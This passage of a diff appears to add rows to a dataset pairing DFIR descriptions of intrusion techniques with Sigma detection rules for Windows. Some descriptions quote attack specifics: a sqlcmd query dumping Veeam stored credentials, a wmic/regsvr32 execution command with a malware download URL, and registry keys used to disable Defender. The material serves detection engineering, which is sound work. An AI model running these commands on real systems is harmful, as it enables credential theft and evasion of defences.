+            - 'HKCU:'
+            - 'HKLM:'
+            - 'registry::'
+            - 'HKEY_'
+    condition: all of selection_*",
+folder_09,"Threat actors created a scheduled task with a GUID name {97F2F70B-10D1-4447-A2F3-9B070C86E261} that executed a PowerShell command to retrieve and execute payloads from the Windows Registry. The task used Get-ItemProperty to access registry values and executed the stored payload, providing a persistence mechanism that stores malicious code in the registry rather than on disk.",,proc_creation_win_schtasks_reg_loader.yml,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection_img:
+        - Image|endswith: '\schtasks.exe'
+        - OriginalFileName: 'schtasks.exe'
+    selection_cli_create:
+        CommandLine|contains: '/Create'
+    selection_cli_get:
+        CommandLine|contains:
+            - 'Get-ItemProperty'
+            - ' gp '
+    selection_cli_hive:
+        CommandLine|contains:
+            - 'HKCU:'
+            - 'HKLM:'
+            - 'registry::'
+            - 'HKEY_'
+    filter_main_encoding:
+        CommandLine|contains:
+            - 'FromBase64String'
+            - 'encodedcommand'
+    condition: all of selection_* and not 1 of filter_*",
+folder_09,"Threat actor used sqlcmd.exe to dump credentials from the Veeam database: sqlcmd -E -S localhost,51341 -E -y0 -Q SELECT TOP (1000) [id],[user_name],[password],[usn],[description],[visible],[change_time_utc]FROM [VeeamBackup].[dbo].[Credentials]. They created a C# decryption script to decode the base64 encoded passwords using DPAPI (Data Protection API), created a file veeam1.cs.txt with a decryption method, used .NET Framework's csc.exe to compile the script, and executed the script to reveal passwords used by Veeam. The decryption was done using ProtectedData.Unprotect() method which decrypts data protected by the local machine's encryption key. The entire process was performed via RDP on the backup server.",,proc_creation_win_sqlcmd_veeam_dump.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_tools:
+        Image|endswith: '\sqlcmd.exe'
+    selection_query:
+        CommandLine|contains|all:
+            - 'SELECT'
+            - 'TOP'
+            - '[VeeamBackup].[dbo].[Credentials]'
+    condition: all of selection_*",
+folder_09,"Threat actor used xcopy to copy rundll32.exe to %temp%\entails.exe, likely to evade detection logic based around command line execution. The threat actor used multiple methods to copy files across the network including direct copy command on the domain controller and WMIC to execute copy commands from remote hosts. Specific suspicious copy operations included copying rundll32.exe to %temp%\entails.exe, copying k.exe and p.bat to other hosts in the domain, and attempting to copy files using both direct copy and WMIC as a redundant method. These copy operations were part of the threat actor's lateral movement and file transfer strategy.",,proc_creation_win_susp_copy_system_dir_lolbin.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_tools_cmd:
+        Image|endswith: '\cmd.exe'
+        CommandLine|contains: 'copy '
+    selection_tools_pwsh:
+        Image|endswith:
+            - '\powershell.exe'
+            - '\pwsh.exe'
+        CommandLine|contains:
+            - 'copy-item'
+            - ' copy '
+            - 'cpi '
+            - ' cp '
+    selection_tools_other:
+        - Image|endswith:
+              - '\robocopy.exe'
+              - '\xcopy.exe'
+        - OriginalFileName:
+              - 'robocopy.exe'
+              - 'XCOPY.EXE'
+    selection_target_path:
+        CommandLine|contains:
+            - '\System32'
+            - '\SysWOW64'
+            - '\WinSxS'
+    selection_target_lolbin:
+        CommandLine|contains:
+            - '\bitsadmin.exe'
+            - '\calc.exe'
+            - '\certutil.exe'
+            - '\cmdl32.exe'
+            - '\cscript.exe'
+            - '\mshta.exe'
+            - '\rundll32.exe'
+            - '\wscript.exe'
+    condition: 1 of selection_tools_* and all of selection_target_*",
+folder_09,"Threat actor used xcopy to copy rundll32.exe to %temp%\entails.exe, likely to evade detection logic based around command line execution. The threat actor used multiple methods to copy files across the network including direct copy command on the domain controller and WMIC to execute copy commands from remote hosts. Specific suspicious copy operations included copying rundll32.exe to %temp%\entails.exe, copying k.exe and p.bat to other hosts in the domain, and attempting to copy files using both direct copy and WMIC as a redundant method. These copy operations were part of the threat actor's lateral movement and file transfer strategy.",,proc_creation_win_susp_copy_system_dir.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_cmd:
+        Image|endswith: '\cmd.exe'
+        CommandLine|contains: 'copy '
+    selection_pwsh:
+        Image|endswith:
+            - '\powershell.exe'
+            - '\pwsh.exe'
+        CommandLine|contains:
+            - 'copy-item'
+            - ' copy '
+            - 'cpi '
+            - ' cp '
+    selection_other:
+        - Image|endswith:
+              - '\robocopy.exe'
+              - '\xcopy.exe'
+        - OriginalFileName:
+              - 'robocopy.exe'
+              - 'XCOPY.EXE'
+    target:
+        CommandLine|contains:
+            - '\System32'
+            - '\SysWOW64'
+            - '\WinSxS'
+    condition: 1 of selection_* and target",
+folder_09,"From referenced DFIR reports, threat actors use different log query utilities and commands to search and dump the content of specific event logs or look for specific event IDs. This technique is used to extract sensitive information from event logs such as usernames, IP addresses, hostnames, etc. Attackers may query specific event logs like Microsoft-Windows-Security-Auditing, Microsoft-Windows-PowerShell, Security logs, and target specific event IDs like 4624 (logon events), 4778 (session reconnect), and 25 (Terminal Services session events) to gather intelligence about system activity and users.",,proc_creation_win_susp_eventlog_content_recon.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_wmi:
+        CommandLine|contains|all:
+            - 'Select'
+            - 'Win32_NTLogEvent'
+    selection_wevtutil_img:
+        - Image|endswith: '\wevtutil.exe'
+        - OriginalFileName: 'wevtutil.exe'
+    selection_wevtutil_cli:
+        CommandLine|contains:
+            - ' qe '
+            - ' query-events '
+    selection_wmic_img:
+        - Image|endswith: '\wmic.exe'
+        - OriginalFileName: 'wmic.exe'
+    selection_wmic_cli:
+        CommandLine|contains: ' ntevent'
+    selection_cmdlet:
+        CommandLine|contains:
+            - 'Get-WinEvent '
+            - 'get-eventlog '
+    selection_logs_name:
+        CommandLine|contains:
+            - 'Microsoft-Windows-PowerShell'
+            - 'Microsoft-Windows-Security-Auditing'
+            - 'Microsoft-Windows-TerminalServices-LocalSessionManager'
+            - 'Microsoft-Windows-TerminalServices-RemoteConnectionManager'
+            - 'Microsoft-Windows-Windows Defender'
+            - 'PowerShellCore'
+            - 'Security'
+            - 'Windows PowerShell'
+    selection_logs_eid:
+        CommandLine|contains:
+            - '-InstanceId 462?'
+            - '.eventid -eq 462?'
+            - 'EventCode=?462?'
+            - 'EventIdentifier=?462?'
+            - 'System[EventID=462?]'
+            - '-InstanceId 4778'
+            - '.eventid -eq 4778'
+            - 'System[EventID=4778]'
+            - 'EventCode=?4778?'
+            - 'EventIdentifier=?4778?'
+            - '-InstanceId 25'
+            - '.eventid -eq 25'
+            - 'System[EventID=25]'
+            - 'EventCode=?25?'
+            - 'EventIdentifier=?25?'
+    condition: 1 of selection_logs_* and (selection_wmi or all of selection_wevtutil_* or all of selection_wmic_* or selection_cmdlet)",
+folder_10,Initial execution involved an xlsm document that used a macro to initiate a wmic command and executed a file via regsvr32 from a remote executable disguised as a GIF image. Specific execution: wmic.exe process call create 'regsvr32 -s C:\Users\Public\microsoft.security'. Downloaded file from http://vpu03jivmm03qncgx.com/index.gif where the GIF was actually the IcedID malware. The execution method leveraged Office application (Excel) to spawn a suspicious child process through wmic and regsvr32.,,proc_creation_win_wmic_execution_via_office_process.yml,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection_img:
+        - Image|endswith: '\wbem\WMIC.exe'
+        - OriginalFileName: 'wmic.exe'
+    selection_parent:
+        ParentImage|endswith:
+            - '\winword.exe'
+            - '\excel.exe'
+            - '\powerpnt.exe'
+    condition: all of selection_*",
+folder_10,"From DFIR reports, threat actors use WMIC for product reconnaissance to gather information about installed software, firewall products, and antivirus solutions. This technique is commonly used during the discovery phase of attacks to understand the security posture of the compromised system and plan further attack vectors accordingly.",,proc_creation_win_wmic_recon_product.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith: '\wmic.exe'
+        - OriginalFileName: 'wmic.exe'
+    selection_cli:
+        CommandLine|contains: 'Product'
+    condition: all of selection_*",
+folder_10,"From referenced DFIR report about SQL Server cryptocurrency mining, threat actors used the C:\Windows\Fonts\ folder to hide malicious files. This folder doesn't require admin privilege to be written to and executed from, making it an attractive location for attackers to store malicious executables, scripts, and other attack tools while attempting to evade detection.",,proc_creation_win_susp_hiding_malware_in_fonts_folder.yml,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection_1:
+        CommandLine|contains:
+            - 'echo'
+            - 'copy'
+            - 'type'
+            - 'file createnew'
+            - 'cacls'
+    selection_2:
+        CommandLine|contains: 'C:\Windows\Fonts\'
+    selection_3:
+        CommandLine|contains:
+            - '.sh'
+            - '.exe'
+            - '.dll'
+            - '.bin'
+            - '.bat'
+            - '.cmd'
+            - '.js'
+            - '.msh'
+            - '.reg'
+            - '.scr'
+            - '.ps'
+            - '.vb'
+            - '.jar'
+            - '.pl'
+            - '.inf'
+            - '.cpl'
+            - '.hta'
+            - '.msi'
+            - '.vbs'
+    condition: all of selection_*",
+folder_10,"Multiple layers of encoding were used including hexadecimal, XOR, base64, and gunzip decoding. Encoded commands often contained MZ headers indicating executable content. A representative encoded command used XOR and Base64 which when decoded revealed executable payloads. Used complex decoding methods and often used -nop -w hidden -c PowerShell flags to hide execution while frequently downloading and executing remote scripts with base64 encoded content.",,proc_creation_win_susp_inline_base64_mz_header.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        CommandLine|contains: 'TVqQAAMAAAAEAAAA'
+    condition: selection",
+folder_10,"From various DFIR reports, threat actors copy legitimate binaries (LOLBins) to non-standard locations including network drives, USB drives, or alternative local drives to evade detection mechanisms that focus on standard system paths. This technique allows execution of trusted binaries from unexpected locations to bypass security controls.",,proc_creation_win_susp_lolbin_exec_from_non_c_drive.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|startswith:
+            - 'D:\'
+            - 'E:\'
+            - 'F:\'
+            - 'G:\'
+            - 'H:\'
+            - 'I:\'
+            - 'J:\'
+            - 'K:\'
+            - 'L:\'
+            - 'M:\'
+            - 'N:\'
+            - 'O:\'
+            - 'P:\'
+            - 'Q:\'
+            - 'R:\'
+            - 'S:\'
+            - 'T:\'
+            - 'U:\'
+            - 'V:\'
+            - 'W:\'
+            - 'X:\'
+            - 'Y:\'
+            - 'Z:\'
+        Image|endswith:
+            - '\bitsadmin.exe'
+            - '\calc.exe'
+            - '\certutil.exe'
+            - '\cmstp.exe'
+            - '\cscript.exe'
+            - '\curl.exe'
+            - '\forfiles.exe'
+            - '\hh.exe'
+            - '\installutil.exe'
+            - '\mshta.exe'
+            - '\msxsl.exe'
+            - '\regsvr32.exe'
+            - '\rundll32.exe'
+            - '\schtasks.exe'
+            - '\scriptrunner.exe'
+            - '\wmic.exe'
+            - '\wscript.exe'
+    condition: selection",
+folder_10,"From DFIR reports, attackers may use the Sysnative folder to access 64-bit system binaries from 32-bit processes or to bypass certain security measures. The C:\Windows\Sysnative path is a special redirection mechanism in Windows that allows 32-bit applications to access native 64-bit system files, which can be abused by threat actors for various purposes.",,proc_creation_win_susp_sysnative.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|contains: '\Sysnative\'
+    condition: selection",
+folder_10,"From various DFIR reports, threat actors often use weak, default, or commonly abused passwords during their attacks. These include passwords like 'password', 'admin', '123456', 'Password123!', and other variations that are frequently used in brute force attacks and credential stuffing attempts.",,proc_creation_win_susp_weak_or_abused_passwords.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        CommandLine|contains:
+            - ' -p password'
+            - ' -p admin'
+            - ' -p 123456'
+            - ' -p Password123!'
+            - ' -p qwerty'
+            - ' /p:password'
+            - ' /p:admin'
+            - ' /p:123456'
+            - ' /p:Password123!'
+            - ' /p:qwerty'
+    condition: selection",
+folder_10,"From DFIR reports, threat actors enumerate user domain information using environment variables to understand the current user context and domain membership. This information helps attackers understand their privilege level and domain structure for planning lateral movement and privilege escalation activities.",,proc_creation_win_userdomain_variable_enumeration.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        CommandLine|contains:
+            - '%USERDOMAIN%'
+            - '%USERDNSDOMAIN%'
+            - '%LOGONSERVER%'
+            - '%COMPUTERNAME%'
+            - '$env:USERDOMAIN'
+            - '$env:USERDNSDOMAIN'
+            - '$env:LOGONSERVER'
+            - '$env:COMPUTERNAME'
+    condition: selection",
+folder_10,"From DFIR reports, Windows Address Book (wab.exe) execution from non-default locations may indicate malicious activity. Threat actors sometimes abuse legitimate Windows binaries like wab.exe by executing them from unusual locations to evade detection or as part of living-off-the-land techniques.",,proc_creation_win_wab_execution_from_non_default_location.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|endswith: '\wab.exe'
+    filter:
+        Image|startswith:
+            - 'C:\Program Files\Windows Mail\'
+            - 'C:\Program Files (x86)\Windows Mail\'
+    condition: selection and not filter",
+folder_10,"From DFIR reports, Windows Address Book (wab.exe) executed by unusual parent processes may indicate process injection or malicious activity. Legitimate wab.exe is typically launched by explorer.exe or mail applications, so execution from unexpected parents like Office applications or system processes should be investigated.",,proc_creation_win_wab_unusual_parents.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|endswith: '\wab.exe'
+    filter:
+        ParentImage|endswith:
+            - '\explorer.exe'
+            - '\wab.exe'
+    condition: selection and not filter",
+folder_11,Initial execution involved an xlsm document that used a macro to initiate a wmic command and executed a file via regsvr32. The execution method leveraged Office applications to spawn suspicious child processes through wmic for defense evasion and execution of malicious payloads. This technique is commonly observed in malicious Office documents.,,proc_creation_win_wmic_susp_execution_via_office_process.yml,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection_img:
+        - Image|endswith: '\wbem\WMIC.exe'
+        - OriginalFileName: 'wmic.exe'
+    selection_parent:
+        ParentImage|endswith:
+            - '\winword.exe'
+            - '\excel.exe'
+            - '\powerpnt.exe'
+            - '\msaccess.exe'
+            - '\mspub.exe'
+            - '\eqnedt32.exe'
+            - '\visio.exe'
+    condition: all of selection_*",
+folder_11,"From DFIR reports, threat actors use WMIC for process creation and execution of malicious payloads. WMIC process call create commands are frequently used to execute files remotely, spawn processes on other systems, and bypass certain detection mechanisms by using legitimate Windows management tools.",,proc_creation_win_wmic_susp_process_creation.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith: '\wmic.exe'
+        - OriginalFileName: 'wmic.exe'
+    selection_cli:
+        CommandLine|contains|all:
+            - 'process'
+            - 'call'
+            - 'create'
+    condition: all of selection_*",
+folder_11,"Threat actors used PowerShell to modify Windows Defender settings and disable security products. They may also use WMIC to uninstall security products entirely to reduce their chances of detection. This includes uninstalling antivirus software, security monitoring tools, and other protective measures installed on compromised systems.",,proc_creation_win_wmic_uninstall_security_products.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith: '\wmic.exe'
+        - OriginalFileName: 'wmic.exe'
+    selection_cli:
+        CommandLine|contains|all:
+            - 'product'
+            - 'uninstall'
+        CommandLine|contains:
+            - 'antivirus'
+            - 'defender'
+            - 'security'
+            - 'firewall'
+    condition: all of selection_*",
+folder_11,The BumbleBee malware used WMI and COM function calls to start processes. Processes spawned were not direct child processes of rundll32 but instead children of WmiPrvSE.exe. The malware used CreateRemoteThread to execute code and created named pipes for inter-process communication. This technique helps evade parent/child process heuristics and allows injecting code into legitimate processes.,,proc_creation_win_wmiprvse_susp_child_processes.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_parent:
+        ParentImage|endswith: '\WmiPrvSE.exe'
+    selection_img:
+        Image|endswith:
+            - '\cmd.exe'
+            - '\powershell.exe'
+            - '\pwsh.exe'
+            - '\rundll32.exe'
+            - '\regsvr32.exe'
+            - '\mshta.exe'
+            - '\cscript.exe'
+            - '\wscript.exe'
+    condition: all of selection_*",
+folder_11,"From DFIR reports, threat actors frequently use wscript.exe and cscript.exe to execute VBScript and JScript files as part of their initial access or persistence mechanisms. These scripts often download additional payloads, execute encoded commands, or establish persistence on compromised systems.",,proc_creation_win_wscript_cscript_dropper.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|endswith:
+            - '\wscript.exe'
+            - '\cscript.exe'
+        CommandLine|contains:
+            - '.vbs'
+            - '.js'
+            - '.vbe'
+            - '.jse'
+    condition: selection",
+folder_12,"The threat actor created a script that uses the registry key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList to hide a user account from the login screen. Setting the value to 0 prevents the account from being displayed on the login screen, effectively hiding it from view while still maintaining system access.",,registry_set_special_accounts.yml,"logsource:
+    category: registry_set
+    product: windows
+detection:
+    selection:
+        TargetObject|contains: '\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
+        Details: 'DWORD (0x00000000)'
+    condition: selection",
+folder_12,"Threat actors created scheduled tasks with GUID-like names as part of their persistence strategy. Tasks were registered in the Windows Task Scheduler cache registry location, allowing for persistent execution of malicious payloads. This technique helps blend malicious tasks with legitimate system tasks.",,registry_set_taskcache_entry.yml,"logsource:
+    category: registry_set
+    product: windows
+detection:
+    selection:
+        TargetObject|contains:
+            - '\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\'
+            - '\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\'
+    condition: selection",
+folder_12,"Threat actor used PowerShell and registry modifications to disable Windows Defender features including disabling Behavior Monitoring, setting Severe Threat default action to Allow, disabling Real-time Monitoring, and adding exclusion paths. Registry keys were modified to disable various Defender protections and monitoring capabilities.",,registry_set_windows_defender_tamper.yml,"logsource:
+    category: registry_set
+    product: windows
+detection:
+    selection:
+        TargetObject|contains:
+            - '\SOFTWARE\Microsoft\Windows Defender\'
+            - '\SOFTWARE\Policies\Microsoft\Windows Defender\'
+        TargetObject|endswith:
+            - '\DisableBehaviorMonitoring'
+            - '\DisableRealtimeMonitoring'
+            - '\DisableAntiSpyware'
+            - '\DisableAntiVirus'
+            - '\SpynetReporting'
+            - '\SubmitSamplesConsent'
+            - '\TamperProtection'
+        Details: 'DWORD (0x00000001)'
+    condition: selection",
+folder_12,"Rclone was used to collect and exfiltrate data from network shares, masquerading as a svchost executable. Three and a half hours into the intrusion, Rclone was used to collect and exfiltrate the contents of network shares for use in a double extortion demand. Data was exfiltrated to a remote server. The attackers carefully disguised the Rclone executable to blend in with normal system processes.",,sysmon_rclone_execution.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - Image|endswith: '\rclone.exe'
+        - Description: 'Rsync for cloud storage'
+        - CommandLine|contains:
+            - '--config'
+            - '--no-check-certificate'
+            - 'copy'
+            - 'sync'
+            - 'remote'
+    condition: selection",
+folder_12,"From DFIR reports, threat actors may access Windows system paths via web requests or URI schemes to extract files, execute commands, or gather system information. This can include attempts to access administrative shares, system directories, or other sensitive locations through web-based attacks.",,web_susp_windows_path_uri.yml,"logsource:
+    category: webserver
+    product: windows
+detection:
+    selection:
+        cs-uri-query|contains:
+            - 'c:\windows\'
+            - 'c:\users\'
+            - 'c:\programdata\'
+            - '%systemroot%'
+            - '%appdata%'
+            - '%temp%'
+        cs-uri-query|contains:
+            - '.exe'
+            - '.dll'
+            - '.bat'
+            - '.cmd'
+            - '.ps1'
+    condition: selection",
+folder_13,"After dropping 1.dll (Cobalt Strike) on the domain controller, the threat actor executed it and installed it as a service for persistence. Cobalt Strike beacons were used throughout the intrusion for command and control, and services were installed to maintain persistent access to compromised systems.",,win_system_cobaltstrike_service_installs.yml,"logsource:
+    category: system
+    product: windows
+detection:
+    selection:
+        EventID: 7045
+        ServiceName|contains:
+            - 'cobalt'
+            - 'beacon'
+            - 'cobaltstrike'
+        ServiceFileName|contains:
+            - '.dll'
+            - 'rundll32'
+            - 'regsvr32'
+    condition: selection",
+folder_13,"Threat actor downloaded AnyDesk and a service was installed to ensure AnyDesk remained available after server restarts. Windows System event 7045 showed service creation with AnyDeskMSI.exe set to auto-start. AnyDesk was configured with a preset password and provided the threat actor with persistent remote access to drop tools, enumerate infrastructure, access credentials, and exfiltrate and encrypt data.",,win_system_service_install_anydesk.yml,"logsource:
+    category: system
+    product: windows
+detection:
+    selection:
+        EventID: 7045
+        ServiceName|contains:
+            - 'AnyDesk'
+            - 'AnyDeskMSI'
+        ServiceFileName|endswith:
+            - '\AnyDesk.exe'
+            - '\AnyDeskMSI.exe'
+    condition: selection",
+folder_13,"From DFIR reports, threat actors may install MeshAgent or similar remote management tools as services to maintain persistent remote access to compromised systems. These tools provide legitimate remote administration capabilities but can be abused by attackers for command and control purposes.",,win_system_service_install_mesh_agent.yml,"logsource:
+    category: system
+    product: windows
+detection:
+    selection:
+        EventID: 7045
+        ServiceName|contains:
+            - 'MeshAgent'
+            - 'Mesh Agent'
+        ServiceFileName|contains:
+            - 'meshagent'
+            - 'mesh_agent'
+    condition: selection",
+folder_13,"From DFIR reports, threat actors may install TacticalRMM or similar remote monitoring and management tools as services to maintain persistent access and control over compromised systems. These tools provide legitimate system administration capabilities but can be abused for malicious purposes.",,win_system_service_install_tacticalrmm.yml,"logsource:
+    category: system
+    product: windows
+detection:
+    selection:
+        EventID: 7045
+        ServiceName|contains:
+            - 'TacticalAgent'
+            - 'TacticalRMM'
+        ServiceFileName|contains:
+            - 'tacticalrmm'
+            - 'tactical'
+    condition: selection",
